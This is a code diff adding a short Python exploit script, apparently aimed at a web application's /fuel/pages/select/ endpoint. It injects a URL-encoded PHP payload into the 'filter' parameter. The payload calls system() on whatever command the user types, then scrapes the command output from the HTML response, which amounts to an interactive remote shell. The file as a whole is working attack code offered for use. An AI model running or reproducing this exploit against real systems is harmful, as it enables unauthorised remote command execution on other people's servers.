@@ -1,0 +1,34 @@
+import requests
+import urllib.parse
+
+url = "http://IP/structure/index.php"
+
+
+while True:
+    # Use input() instead of raw_input() for Python 3
+    cmd = input('cmd: ')
+    
+    # Encode the command properly for the URL
+    burp0_url = url + "/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27" + cmd + "%27%29%2b%27"
+    
+    # Proxy setup (optional)
+    proxy = {"http": "http://127.0.0.1:8080"}
+    
+    # Send request
+    r = requests.get(burp0_url, proxies=proxy)
+    
+    # Find the starting point of the relevant output
+    split_marker = '<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">'
+    
+    # Extract everything up to the split marker
+    if split_marker in r.text:
+        command_output = r.text.split(split_marker)[1]
+        # Now find the exact command output after the </div> tag
+        end_marker = '</div>'
+        if end_marker in command_output:
+            final_output = command_output.split(end_marker)[1]
+            print(final_output.strip())
+        else:
+            print("End marker not found in the response.")
+    else:
+        print("Marker not found in response")
